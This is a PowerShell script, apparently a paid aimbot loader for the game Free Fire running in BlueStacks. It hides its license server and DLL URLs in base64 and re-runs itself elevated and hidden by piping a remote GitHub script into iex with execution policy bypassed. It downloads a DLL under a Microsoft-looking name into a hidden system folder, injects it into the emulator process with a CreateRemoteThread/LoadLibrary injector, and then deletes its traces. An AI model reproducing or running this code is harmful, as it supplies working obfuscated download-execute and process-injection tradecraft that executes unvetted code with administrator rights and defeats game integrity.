# ============================================================
# dugduy.ps1 - PEDPRO STORE (SECURITY & ENCODED VERSION)
# ============================================================

# 1. ตั้งค่าความปลอดภัยเบื้องต้น
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
netsh winhttp reset proxy | Out-Null
$ProgressPreference = 'SilentlyContinue'

# 2. ข้อมูล API (เข้ารหัส Base64 เพื่อพรางตา)
# Original: vGgzXjkfQj / GetX / 1.0
$o_id = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dkdnelhqa2ZRang=")) #
$a_nm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0WA==")) #
$a_vr = "1.0"

# 3. URL สะพานเชื่อม (Encoded) 
# Original: https://getx.getx796.workers.dev
$b_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9nZXR4LmdldHg3OTYud29ya2Vycy5kZXY=")) #

Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "       WELCOME TO PEDPRO STORE          " -ForegroundColor White
Write-Host "    (Security & HWID Lock Enabled)      " -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan

# 4. ระบบ HWID Check
$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID #

# 5. ระบบ Login 
$userKey = Read-Host "[?] Please enter your License Key"

# ขั้นตอน Init
$init_u = "$b_url/api/1.3/?type=init&name=$a_nm&ownerid=$o_id&ver=$a_vr"

try {
    $initReq = Invoke-RestMethod -Uri $init_u -Method Get -TimeoutSec 15 -UserAgent "Mozilla/5.0"
    
    if ($initReq.success -eq "true") {
        $sess = $initReq.sessionid
        
        # ส่งค่า Key และ HWID เพื่อตรวจสอบสิทธิ์
        $l_url = "$b_url/api/1.3/?type=license&key=$userKey&sessionid=$sess&name=$a_nm&ownerid=$o_id&hwid=$hwid"
        $loginReq = Invoke-RestMethod -Uri $l_url -Method Get -UserAgent "Mozilla/5.0"

        if ($loginReq.success -ne "true") {
            Write-Host "[-] ACCESS DENIED: $($loginReq.message)" -ForegroundColor Red
            if ($loginReq.message -like "*HWID*") {
                Write-Host "[!] HWID Mismatch! Reset in dashboard." -ForegroundColor Yellow #
            }
            Pause; exit
        }
        Write-Host "[+] Login Successful!" -ForegroundColor Green
    }
} catch {
    Write-Host "[-] Connection error." -ForegroundColor Red; Pause; exit
}

# 6. Admin Check
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# 7. ดาวน์โหลด DLL (เข้ารหัส URL เพื่อซ่อน Source หลักจาก GitHub)
# Original: https://github.com/getx796-Harem/cmdFreefire/releases/download/v1.0/AimbotFemaleFix.dll
$d_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2dldHg3OTYtSGFyZW0vY21kRnJlZWZpcmUvcmVsZWFzZXMvZG93bmxvYWQvdjEuMC9BaW1ib3RGZW1hbGVGaXguZGxs"))
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir "mscories.dll"

if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
attrib +h +s $workDir

try {
    Invoke-WebRequest -Uri $d_url -OutFile $dllPath -UseBasicParsing
} catch {
    Write-Host "[-] Download failed."; Pause; exit
}

# 8. C# Injector (ส่วนนี้ห้ามแก้)
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# 9. Execution
$proc = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
if ($proc) {
    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
    [Injector]::Inject($proc.Id, $dllPath)
    Write-Host "[+] SUCCESS!" -ForegroundColor Green
} else {
    Write-Host "[-] Open BlueStacks first!" -ForegroundColor Red
}

Start-Sleep -Seconds 3
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
exit
